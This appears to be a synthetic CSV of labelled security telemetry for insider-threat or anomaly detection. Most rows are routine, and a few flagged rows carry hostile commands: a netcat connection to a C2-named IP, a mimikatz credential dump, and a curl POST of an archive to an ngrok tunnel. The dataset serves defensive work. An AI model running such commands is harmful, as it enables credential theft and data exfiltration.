timestamp,user_id,username,department,ip_address,event_type,failed_login_attempts,files_affected,usb_bluetooth_usage,bytes_sent_kb,bytes_received_kb,destination_site,application_shell_cmd,status,is_anomaly,action,details
2026-03-13T08:20:29.584Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,0,0,10.7,288.2,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:23:28.244Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,1,0,17.5,29.1,internal-portal.corp,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:26:40.069Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,0,0,29.9,1028.6,api.github.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:29:27.782Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,1,4,0,115.1,779.7,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:32:33.853Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,0,0,169.6,588.4,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:34:51.764Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,2,0,216.6,473.8,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:38:10.355Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,0,0,140.6,674.7,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:41:17.316Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,2,0,224.6,449.1,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:43:59.509Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,3,0,192,278.3,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:46:50.507Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,4,0,90.6,891.2,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:49:01.634Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,3,0,105.3,997.5,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:52:49.842Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,2,0,36.8,469.3,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:55:05.988Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,0,0,95.3,374.3,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:58:22.229Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,0,0,182.6,1042.6,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:00:31.110Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,1,0,42.3,161.5,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:03:23.328Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,0,4,0,198.5,443.6,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:06:39.736Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,2,0,152,111.8,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:09:09.791Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,0,0,147.9,249.1,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:12:02.952Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_ACCESS,0,0,0,87.8,52,aws.us-east-1.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:15:51.865Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,3,0,25.2,306.7,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:18:26.147Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,4,0,123.1,1105.6,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:21:29.650Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,3,0,98.5,723.8,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:24:23.282Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,0,0,85.5,1041.1,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:26:34.130Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,2,0,65.3,1122,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:30:08.803Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,0,0,152.6,898.3,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:32:37.557Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,4,0,245.9,708.6,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:35:51.504Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,2,0,150.8,945.5,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:38:11.256Z,usr-108,henry.todd,FINANCE,10.0.5.12,LOGIN,0,0,0,20.4,1215.2,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:41:18.537Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,1,0,0,252.8,694.5,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:44:05.220Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,1,0,103.5,573.6,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:47:22.621Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,4,0,246.5,464.2,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:49:31.318Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,1,0,94.8,437.1,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:52:33.261Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,2,0,60,87.7,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:56:11.024Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,1,0,187.8,167.8,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T09:58:40.174Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,1,34,0,5745.3,6433.2,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-13T10:00:58.575Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,1,0,234.5,1152.8,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:04:35.951Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,0,0,86.1,533.9,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:06:46.551Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,1,0,102.1,1145.6,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:10:24.216Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,1,0,174.4,305.1,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:13:04.227Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,1,0,83.2,420.7,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:16:02.126Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,3,0,243.6,979.5,gitlab.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:18:55.114Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,1,2,0,220,672.3,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:21:57.107Z,usr-106,frank.miller,IT,10.0.1.50,FILE_ACCESS,0,4,0,248,1203.7,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:24:15.591Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,2,0,200.6,217.6,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:27:44.619Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,0,0,54.1,697.3,internal-portal.corp,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:30:31.358Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,SHELL_EXECUTION,0,6,0,289.7,108.7,temp-dropzone.cc,mimikatz.exe privilege::debug sekurlsa::logonpasswords,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-13T10:33:05.244Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,0,4,0,33.5,982.3,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:36:11.566Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,4,0,18,389.3,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:38:37.233Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,2,0,249.5,372.1,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:42:04.222Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,3,0,143.3,997.4,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:44:48.115Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,2,0,51.1,1015.5,aws.us-east-1.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:47:16.653Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,0,0,130.1,1044.7,jira.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:50:47.637Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,3,0,172.7,909.9,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:53:16.310Z,usr-106,frank.miller,IT,10.0.1.50,FILE_ACCESS,0,1,0,31.7,671.1,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:56:15.398Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,1,2,0,167.6,1185.6,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T10:58:39.228Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,0,0,52.5,247.8,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:01:35.781Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,2,0,20.1,611.6,gitlab.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:04:26.196Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,3,0,211.4,212.8,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:07:22.078Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,0,0,161.9,260.4,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:10:17.020Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_ACCESS,0,4,0,98.3,103.7,api.github.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:13:37.619Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,1,0,173.7,1079.3,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:15:50.651Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,282,0,204731.6,545.3,tunnel-ngrok.io,curl -X POST --data-binary @archive.tar.gz,SUCCESS,1,ALERT,Mass file exfiltration velocity to external site (282 files)
2026-03-13T11:18:43.523Z,usr-103,carol.zhang,HR,10.0.2.88,SHELL_EXECUTION,0,4,0,54.4,298.9,temp-dropzone.cc,mimikatz.exe privilege::debug sekurlsa::logonpasswords,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-13T11:22:10.344Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,USB_ACTIVITY,0,70,1,54605.9,201.2,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-13T11:24:52.506Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,4,0,182.8,305.7,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:28:02.235Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,0,0,169.5,173.7,internal-portal.corp,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:30:47.859Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,1,0,46.9,1075.2,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:33:08.618Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,3,0,238.4,617.3,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:36:30.182Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,0,0,21.6,672.7,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:39:11.423Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,3,0,170.1,706.4,aws.us-east-1.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:41:46.774Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,4,0,101.2,144.1,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:45:21.825Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,0,3,0,96.2,354.2,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:48:25.835Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,3,0,51.2,130.7,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:51:11.464Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,1,0,48.2,391.5,gitlab.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:53:17.250Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,0,0,126.8,914.8,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:56:43.204Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,0,0,147,247.8,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T11:59:02.870Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,4,0,34.1,572.3,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:02:03.186Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,3,0,16.6,120.4,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:05:42.030Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,2,0,195,729.9,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:07:47.136Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,0,0,141.8,845,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:10:51.254Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,4,0,174.1,408.3,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:14:17.408Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,0,2,0,225.2,73.3,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:17:08.897Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_ACCESS,0,1,0,173.3,1199.6,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:19:38.616Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,0,0,70.1,466.9,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:22:30.651Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,1,0,65.6,453.2,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:25:31.709Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,0,0,124,375.1,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:28:08.993Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,2,0,8.5,58.3,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:30:45.524Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,1,0,166.3,436.4,gitlab.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:34:31.170Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,3,0,13.6,93,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:36:42.852Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,2,0,239.6,710.2,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:39:29.861Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,4,0,127.9,206,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:43:02.149Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,1,0,153.4,447.8,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:45:29.475Z,usr-108,henry.todd,FINANCE,10.0.5.12,LOGIN,0,3,0,240,722.1,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:48:53.359Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,4,0,216.4,1080.7,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:51:15.338Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,4,0,122.9,290,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:54:43.850Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,3,0,99.4,191.1,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T12:57:32.676Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,4,0,180.6,720.8,internal-portal.corp,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:00:26.491Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,0,0,191.7,1078.7,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:02:30.969Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,0,0,27,288.9,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:05:38.908Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,3,0,107.5,136.6,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:08:38.572Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,0,0,144.1,1065.7,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:11:11.025Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,4,0,107.5,390.5,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:13:57.711Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,1,0,201.1,1145.5,docs.google.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:17:06.417Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,12,0,0,15.7,6.4,auth-sso.corp.internal,none,FAILURE,1,BLOCK,Repeated authentication failure sequence: 12 consecutive attempts
2026-03-13T13:19:59.281Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,1,3,0,63.7,337.3,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:23:16.114Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,2,0,16,463,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:25:56.969Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_ACCESS,0,1,0,229.4,879.9,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:28:58.723Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,2,0,5,612.4,sharepoint.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:31:36.765Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,1,1,0,161.6,198.6,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:34:29.106Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,4,0,208.8,648.6,jira.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:37:35.442Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,0,3,0,179.4,895.1,aws.us-east-1.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:40:32.461Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,8,0,0,7.9,12.2,auth-sso.corp.internal,none,FAILURE,1,BLOCK,Repeated authentication failure sequence: 8 consecutive attempts
2026-03-13T13:42:48.994Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_ACCESS,0,3,0,248.9,196.2,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:46:28.497Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,0,0,25.8,457.6,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:48:48.872Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,4,0,56.9,928.8,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:51:28.282Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,4,0,242.8,250.4,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:54:32.434Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,3,0,153.7,224.5,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T13:58:04.331Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,2,0,39.1,979.3,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T14:00:16.023Z,usr-105,elena.rostova,SECURITY,10.0.9.3,USB_ACTIVITY,0,24,1,116625.6,53.4,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-13T14:03:19.121Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,0,0,47.1,561.4,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T14:05:55.322Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,0,2,0,5,219.4,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T14:09:08.454Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,0,0,254.6,1045.4,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T14:11:39.661Z,usr-108,henry.todd,FINANCE,10.0.5.12,NETWORK_CONNECTION,1,4,0,136.8,407.5,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T14:15:00.501Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,2,0,213.4,828.9,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T14:17:28.334Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,3,0,154.1,663.7,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T14:20:31.280Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,0,0,237.2,205.9,api.github.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
